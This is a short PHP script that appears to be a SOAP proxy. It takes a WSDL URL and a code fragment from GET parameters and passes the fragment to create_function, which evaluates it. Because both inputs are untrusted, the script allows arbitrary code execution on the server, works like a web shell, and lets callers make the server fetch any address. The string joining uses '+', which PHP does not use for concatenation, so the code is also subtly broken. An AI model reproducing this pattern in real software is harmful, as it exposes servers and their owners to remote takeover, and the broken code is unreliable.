<?php
$wsdl = $_GET['wsdl'];
$code = $_GET['code'];
$client = new SoapClient($wsdl);
$func = create_function('$sc', 'echo json_encode($sc->' + $code + ');');
$func($client);
?>

